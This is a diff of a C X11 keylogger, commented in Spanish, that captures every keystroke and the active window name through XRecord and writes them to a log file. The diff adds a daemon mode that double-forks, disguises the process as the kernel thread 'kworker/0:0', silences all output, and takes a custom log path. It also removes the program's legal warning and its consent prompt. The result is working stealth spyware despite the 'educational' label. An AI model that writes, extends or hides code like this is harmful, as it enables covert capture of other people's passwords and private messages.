@@ -18,27 +18,55 @@
 #include <X11/Xlib.h>
 #include <X11/Xutil.h>
 #include <X11/keysym.h>
+#include <X11/XKBlib.h>
 #include <X11/extensions/record.h>
 #include <time.h>
 #include <signal.h>
 #include <unistd.h>
 #include <pthread.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/prctl.h>
+#include <getopt.h>
 
 #define LOG_FILE "keylog.txt"
 #define MAX_WINDOW_NAME 256
+#define DAEMON_PROCESS_NAME "kworker/0:0"  // Nombre que simula un proceso del kernel
 
-// Variables globales para manejo de señales
-Display *display = NULL;
-Display *record_display = NULL;
-FILE *logfile = NULL;
-volatile sig_atomic_t running = 1;
-XRecordContext record_context = 0;
+// Estructura para encapsular el estado del keylogger
+typedef struct {
+    Display *display;
+    Display *record_display;
+    FILE *logfile;
+    XRecordContext record_context;
+    volatile sig_atomic_t running;
+    int daemon_mode;
+    int quiet_mode;
+    char log_filename[256];
+    char last_window[MAX_WINDOW_NAME];
+} KeyloggerState;
+
+// Estado global del keylogger
+static KeyloggerState g_state = {
+    .display = NULL,
+    .record_display = NULL,
+    .logfile = NULL,
+    .record_context = 0,
+    .running = 1,
+    .daemon_mode = 0,
+    .quiet_mode = 0,
+    .log_filename = LOG_FILE,
+    .last_window = {0}
+};
 
 // Manejador de señales para limpieza
 void signal_handler(int signum) {
     (void)signum; // Parámetro requerido pero no usado
-    running = 0;
-    printf("\n[!] Deteniendo keylogger...\n");
+    g_state.running = 0;
+    if (!g_state.quiet_mode && !g_state.daemon_mode) {
+        printf("\n[!] Deteniendo keylogger...\n");
+    }
 }
 
 // Obtener el nombre de la ventana activa
@@ -155,13 +183,15 @@ void log_key_event(const char *window_name, const char *key_str) {
     get_timestamp(timestamp, sizeof(timestamp));
     
     // Escribir en archivo
-    if (logfile) {
-        fprintf(logfile, "[%s] [%s] %s\n", timestamp, window_name, key_str);
-        fflush(logfile);
+    if (g_state.logfile) {
+        fprintf(g_state.logfile, "[%s] [%s] %s\n", timestamp, window_name, key_str);
+        fflush(g_state.logfile);
     }
     
-    // Mostrar en consola (opcional, comentar en producción)
-    printf("[%s] [%s] %s\n", timestamp, window_name, key_str);
+    // Mostrar en consola solo si no está en modo silencioso/daemon
+    if (!g_state.quiet_mode && !g_state.daemon_mode) {
+        printf("[%s] [%s] %s\n", timestamp, window_name, key_str);
+    }
 }
 
 // Callback para XRecord - aquí se procesan los eventos capturados
@@ -178,25 +208,28 @@ void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
             unsigned char keycode = recorded_data->data[1];
             
             // Obtener ventana con foco
-            Window focused = get_focused_window(display);
-            char *window_name = get_window_name(display, focused);
+            Window focused = get_focused_window(g_state.display);
+            char *window_name = get_window_name(g_state.display, focused);
             
-            // Convertir keycode a keysym
-            KeySym keysym = XKeycodeToKeysym(display, keycode, 0);
+            // Convertir keycode a keysym usando XkbKeycodeToKeysym (reemplaza función deprecada)
+            KeySym keysym = XkbKeycodeToKeysym(g_state.display, keycode, 0, 0);
             const char *key_str = keysym_to_string(keysym);
             
-            // Registrar el evento
-            static char *last_window_name = NULL;
-            if (last_window_name == NULL || strcmp(last_window_name, window_name) != 0) {
+            // Detectar cambio de ventana (usando buffer estático en g_state)
+            if (g_state.last_window[0] == '\0' || strcmp(g_state.last_window, window_name) != 0) {
                 char window_change_msg[512];
                 snprintf(window_change_msg, sizeof(window_change_msg), 
                         "\n--- Ventana activa: %s ---\n", window_name);
-                if (logfile) {
-                    fprintf(logfile, "%s", window_change_msg);
-                    fflush(logfile);
+                if (g_state.logfile) {
+                    fprintf(g_state.logfile, "%s", window_change_msg);
+                    fflush(g_state.logfile);
                 }
-                printf("%s", window_change_msg);
-                last_window_name = window_name;
+                if (!g_state.quiet_mode && !g_state.daemon_mode) {
+                    printf("%s", window_change_msg);
+                }
+                // Copiar el nombre de ventana de forma segura
+                strncpy(g_state.last_window, window_name, MAX_WINDOW_NAME - 1);
+                g_state.last_window[MAX_WINDOW_NAME - 1] = '\0';
             }
             
             log_key_event(window_name, key_str);
@@ -207,67 +240,216 @@ void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
     XRecordFreeData(recorded_data);
 }
 
-// Función principal del keylogger
-int start_keylogger() {
+/**
+ * Daemoniza el proceso para ejecutarse en segundo plano.
+ * - Hace fork() para desacoplar del terminal padre
+ * - Crea nueva sesión con setsid()
+ * - Cambia el nombre del proceso para ocultarlo
+ * - Cierra stdin/stdout/stderr
+ * 
+ * @return 0 si es el proceso hijo (daemon), -1 en error, >0 si es el padre
+ */
+int daemonize(void) {
+    pid_t pid;
+    
+    // Primer fork: el padre termina, el hijo continúa
+    pid = fork();
+    if (pid < 0) {
+        return -1;  // Error en fork
+    }
+    if (pid > 0) {
+        // Proceso padre: termina silenciosamente
+        printf("[*] Proceso daemon iniciado con PID: %d\n", pid);
+        printf("[*] El keylogger se ejecuta en segundo plano.\n");
+        printf("[*] Log: %s\n", g_state.log_filename);
+        printf("[*] Para detener: kill %d\n", pid);
+        exit(0);
+    }
+    
+    // Crear nueva sesión (desacoplar del terminal)
+    if (setsid() < 0) {
+        return -1;
+    }
+    
+    // Segundo fork: previene que el daemon adquiera un terminal de control
+    pid = fork();
+    if (pid < 0) {
+        return -1;
+    }
+    if (pid > 0) {
+        exit(0);  // El primer hijo termina
+    }
+    
+    // Cambiar el nombre del proceso para ocultarlo
+    // Esto hace que aparezca como un proceso del sistema en `ps` y `top`
+    if (prctl(PR_SET_NAME, DAEMON_PROCESS_NAME, 0, 0, 0) < 0) {
+        // No es crítico si falla, continuamos
+    }
+    
+    // Cambiar directorio de trabajo a raíz (evita bloquear montajes)
+    if (chdir("/") < 0) {
+        // No es crítico
+    }
+    
+    // Establecer máscara de permisos
+    umask(0);
+    
+    // Cerrar descriptores de archivo estándar
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+    
+    // Redirigir stdin/stdout/stderr a /dev/null
+    int fd = open("/dev/null", O_RDWR);
+    if (fd >= 0) {
+        dup2(fd, STDIN_FILENO);
+        dup2(fd, STDOUT_FILENO);
+        dup2(fd, STDERR_FILENO);
+        if (fd > STDERR_FILENO) {
+            close(fd);
+        }
+    }
+    
+    return 0;  // Éxito, somos el daemon
+}
+
+/**
+ * Limpia todos los recursos del keylogger.
+ * Centraliza la lógica de limpieza para evitar duplicación.
+ */
+void cleanup_resources(void) {
     char timestamp[64];
     
-    printf("[*] Keylogger educativo iniciado.\n");
-    printf("[*] Capturando eventos de teclado en X11 usando XRecord...\n");
-    printf("[*] Archivo de log: %s\n", LOG_FILE);
-    printf("[*] Presione Ctrl+C para detener.\n\n");
+    // Deshabilitar y liberar contexto de grabación
+    if (g_state.record_context && g_state.record_display) {
+        XRecordDisableContext(g_state.record_display, g_state.record_context);
+        XRecordFreeContext(g_state.record_display, g_state.record_context);
+        g_state.record_context = 0;
+    }
+    
+    // Cerrar archivo de log
+    if (g_state.logfile) {
+        fprintf(g_state.logfile, "\n=== Sesión finalizada ===\n");
+        get_timestamp(timestamp, sizeof(timestamp));
+        fprintf(g_state.logfile, "Fin: %s\n\n", timestamp);
+        fclose(g_state.logfile);
+        g_state.logfile = NULL;
+    }
+    
+    // Cerrar conexiones X11
+    if (g_state.display) {
+        XCloseDisplay(g_state.display);
+        g_state.display = NULL;
+    }
+    
+    if (g_state.record_display) {
+        XCloseDisplay(g_state.record_display);
+        g_state.record_display = NULL;
+    }
+}
+
+/**
+ * Muestra la ayuda de uso del programa.
+ */
+void print_usage(const char *prog_name) {
+    printf("X11 Educational Keylogger\n");
+    printf("USO EDUCATIVO SOLAMENTE\n\n");
+    printf("Uso: %s [opciones]\n\n", prog_name);
+    printf("Opciones:\n");
+    printf("  -d, --daemon     Ejecutar en segundo plano (oculto)\n");
+    printf("  -q, --quiet      Modo silencioso (sin output a consola)\n");
+    printf("  -o, --output     Archivo de log (default: %s)\n", LOG_FILE);
+    printf("  -h, --help       Mostrar esta ayuda\n\n");
+    printf("Ejemplos:\n");
+    printf("  %s                    # Modo normal, visible en consola\n", prog_name);
+    printf("  %s -d                 # Modo daemon, oculto en segundo plano\n", prog_name);
+    printf("  %s -d -o /tmp/k.log   # Daemon con log personalizado\n", prog_name);
+}
+
+// Función principal del keylogger
+int start_keylogger(void) {
+    char timestamp[64];
+    
+    // Si es modo daemon, daemonizar primero
+    if (g_state.daemon_mode) {
+        if (daemonize() < 0) {
+            fprintf(stderr, "[!] Error: No se pudo daemonizar el proceso.\n");
+            return 1;
+        }
+        // Después de daemonize(), el output va a /dev/null
+        g_state.quiet_mode = 1;  // Forzar modo silencioso
+    }
+    
+    if (!g_state.quiet_mode) {
+        printf("[*] Keylogger educativo iniciado.\n");
+        printf("[*] Capturando eventos de teclado en X11 usando XRecord...\n");
+        printf("[*] Archivo de log: %s\n", g_state.log_filename);
+        printf("[*] Presione Ctrl+C para detener.\n\n");
+    }
     
     // Abrir conexión principal con X11
-    display = XOpenDisplay(NULL);
-    if (display == NULL) {
-        fprintf(stderr, "[!] Error: No se puede conectar al servidor X11.\n");
-        fprintf(stderr, "[!] Asegúrese de estar en un entorno con X11 activo.\n");
+    g_state.display = XOpenDisplay(NULL);
+    if (g_state.display == NULL) {
+        if (!g_state.quiet_mode) {
+            fprintf(stderr, "[!] Error: No se puede conectar al servidor X11.\n");
+            fprintf(stderr, "[!] Asegúrese de estar en un entorno con X11 activo.\n");
+        }
         return 1;
     }
     
     // Verificar si la extensión XRecord está disponible
     int major, minor;
-    if (!XRecordQueryVersion(display, &major, &minor)) {
-        fprintf(stderr, "[!] Error: La extensión XRecord no está disponible.\n");
-        fprintf(stderr, "[!] Esta extensión es necesaria para capturar eventos sin bloquear el teclado.\n");
-        XCloseDisplay(display);
+    if (!XRecordQueryVersion(g_state.display, &major, &minor)) {
+        if (!g_state.quiet_mode) {
+            fprintf(stderr, "[!] Error: La extensión XRecord no está disponible.\n");
+        }
+        XCloseDisplay(g_state.display);
         return 1;
     }
-    printf("[*] Extensión XRecord versión %d.%d detectada.\n", major, minor);
+    if (!g_state.quiet_mode) {
+        printf("[*] Extensión XRecord versión %d.%d detectada.\n", major, minor);
+    }
     
     // Abrir segunda conexión para la grabación (requerido por XRecord)
-    record_display = XOpenDisplay(NULL);
-    if (record_display == NULL) {
-        fprintf(stderr, "[!] Error: No se puede abrir segunda conexión X11 para grabación.\n");
-        XCloseDisplay(display);
+    g_state.record_display = XOpenDisplay(NULL);
+    if (g_state.record_display == NULL) {
+        if (!g_state.quiet_mode) {
+            fprintf(stderr, "[!] Error: No se puede abrir segunda conexión X11.\n");
+        }
+        XCloseDisplay(g_state.display);
         return 1;
     }
     
     // Abrir archivo de log
-    logfile = fopen(LOG_FILE, "a");
-    if (logfile == NULL) {
-        fprintf(stderr, "[!] Error: No se puede abrir el archivo de log.\n");
-        XCloseDisplay(display);
-        XCloseDisplay(record_display);
+    g_state.logfile = fopen(g_state.log_filename, "a");
+    if (g_state.logfile == NULL) {
+        if (!g_state.quiet_mode) {
+            fprintf(stderr, "[!] Error: No se puede abrir el archivo de log.\n");
+        }
+        XCloseDisplay(g_state.display);
+        XCloseDisplay(g_state.record_display);
         return 1;
     }
     
     // Escribir encabezado en el log
-    fprintf(logfile, "\n=== Nueva sesión de keylogging ===\n");
+    fprintf(g_state.logfile, "\n=== Nueva sesión de keylogging ===\n");
     get_timestamp(timestamp, sizeof(timestamp));
-    fprintf(logfile, "Inicio: %s\n\n", timestamp);
-    fflush(logfile);
+    fprintf(g_state.logfile, "Inicio: %s\n", timestamp);
+    fprintf(g_state.logfile, "Modo: %s\n\n", g_state.daemon_mode ? "daemon" : "normal");
+    fflush(g_state.logfile);
     
     // Configurar manejador de señales
     signal(SIGINT, signal_handler);
     signal(SIGTERM, signal_handler);
+    signal(SIGHUP, SIG_IGN);  // Ignorar SIGHUP para daemons
     
     // Configurar el rango de eventos a capturar
     XRecordRange *record_range = XRecordAllocRange();
     if (record_range == NULL) {
-        fprintf(stderr, "[!] Error: No se puede asignar rango de grabación.\n");
-        fclose(logfile);
-        XCloseDisplay(display);
-        XCloseDisplay(record_display);
+        if (!g_state.quiet_mode) {
+            fprintf(stderr, "[!] Error: No se puede asignar rango de grabación.\n");
+        }
+        cleanup_resources();
         return 1;
     }
     
@@ -277,93 +459,85 @@ int start_keylogger() {
     
     // Crear contexto de grabación para todos los clientes
     XRecordClientSpec client_spec = XRecordAllClients;
-    record_context = XRecordCreateContext(record_display, 0, &client_spec, 1, &record_range, 1);
+    g_state.record_context = XRecordCreateContext(g_state.record_display, 0, &client_spec, 1, &record_range, 1);
     
-    if (record_context == 0) {
-        fprintf(stderr, "[!] Error: No se puede crear contexto de grabación XRecord.\n");
+    if (g_state.record_context == 0) {
+        if (!g_state.quiet_mode) {
+            fprintf(stderr, "[!] Error: No se puede crear contexto XRecord.\n");
+        }
         XFree(record_range);
-        fclose(logfile);
-        XCloseDisplay(display);
-        XCloseDisplay(record_display);
+        cleanup_resources();
         return 1;
     }
     
     XFree(record_range);
     
-    printf("[*] Contexto XRecord creado. Monitoreando eventos sin bloquear el teclado...\n\n");
+    if (!g_state.quiet_mode) {
+        printf("[*] Contexto XRecord creado. Monitoreando...\n\n");
+    }
     
     // Habilitar el contexto de grabación
-    // Esta llamada es bloqueante y procesa eventos hasta que running = 0
-    if (!XRecordEnableContextAsync(record_display, record_context, record_callback, NULL)) {
-        fprintf(stderr, "[!] Error: No se puede habilitar contexto de grabación.\n");
-        XRecordFreeContext(record_display, record_context);
-        fclose(logfile);
-        XCloseDisplay(display);
-        XCloseDisplay(record_display);
+    if (!XRecordEnableContextAsync(g_state.record_display, g_state.record_context, record_callback, NULL)) {
+        if (!g_state.quiet_mode) {
+            fprintf(stderr, "[!] Error: No se puede habilitar contexto.\n");
+        }
+        cleanup_resources();
         return 1;
     }
     
     // Loop principal - procesar eventos XRecord
-    while (running) {
-        XRecordProcessReplies(record_display);
+    while (g_state.running) {
+        XRecordProcessReplies(g_state.record_display);
     }
     
     // Limpieza
-    printf("\n[*] Limpiando recursos...\n");
-    
-    // Deshabilitar y liberar contexto de grabación
-    XRecordDisableContext(record_display, record_context);
-    XRecordFreeContext(record_display, record_context);
-    
-    if (logfile) {
-        fprintf(logfile, "\n=== Sesión finalizada ===\n");
-        get_timestamp(timestamp, sizeof(timestamp));
-        fprintf(logfile, "Fin: %s\n\n", timestamp);
-        fclose(logfile);
+    if (!g_state.quiet_mode) {
+        printf("\n[*] Limpiando recursos...\n");
     }
     
-    if (display) {
-        XCloseDisplay(display);
-    }
+    cleanup_resources();
     
-    if (record_display) {
-        XCloseDisplay(record_display);
+    if (!g_state.quiet_mode) {
+        printf("[*] Keylogger detenido correctamente.\n");
+        printf("[*] Log guardado en: %s\n", g_state.log_filename);
     }
-    
-    printf("[*] Keylogger detenido correctamente.\n");
-    printf("[*] Log guardado en: %s\n", LOG_FILE);
     
     return 0;
 }
 
 int main(int argc, char *argv[]) {
-    printf("\n");
-    printf("═══════════════════════════════════════════════════════════════\n");
-    printf("  X11 EDUCATIONAL KEYLOGGER - Demostración de Vulnerabilidades\n");
-    printf("═══════════════════════════════════════════════════════════════\n");
-    printf("\n");
-    printf("ADVERTENCIA LEGAL:\n");
-    printf("Este programa es SOLO para propósitos educativos.\n");
-    printf("El uso no autorizado puede ser ILEGAL en su jurisdicción.\n");
-    printf("Use únicamente en sistemas propios o con permiso explícito.\n");
-    printf("\n");
-    printf("Este keylogger demuestra vulnerabilidades de X11:\n");
-    printf("- Cualquier aplicación puede capturar eventos de teclado\n");
-    printf("- No se requieren privilegios de root/administrador\n");
-    printf("- No hay notificación al usuario sobre la captura\n");
-    printf("- X11 fue diseñado en 1984 sin seguridad moderna en mente\n");
-    printf("\n");
+    int opt;
     
-    // Solicitar confirmación del usuario
-    printf("¿Desea continuar? (s/n): ");
-    char response;
-    scanf(" %c", &response);
+    // Opciones largas para getopt_long
+    static struct option long_options[] = {
+        {"daemon",  no_argument,       0, 'd'},
+        {"quiet",   no_argument,       0, 'q'},
+        {"output",  required_argument, 0, 'o'},
+        {"help",    no_argument,       0, 'h'},
+        {0, 0, 0, 0}
+    };
     
-    if (response != 's' && response != 'S') {
-        printf("\n[*] Operación cancelada.\n");
-        return 0;
+    // Parsear argumentos de línea de comandos
+    while ((opt = getopt_long(argc, argv, "dqo:h", long_options, NULL)) != -1) {
+        switch (opt) {
+            case 'd':
+                g_state.daemon_mode = 1;
+                break;
+            case 'q':
+                g_state.quiet_mode = 1;
+                break;
+            case 'o':
+                strncpy(g_state.log_filename, optarg, sizeof(g_state.log_filename) - 1);
+                g_state.log_filename[sizeof(g_state.log_filename) - 1] = '\0';
+                break;
+            case 'h':
+                print_usage(argv[0]);
+                return 0;
+            default:
+                print_usage(argv[0]);
+                return 1;
+        }
     }
     
-    printf("\n");
     return start_keylogger();
 }
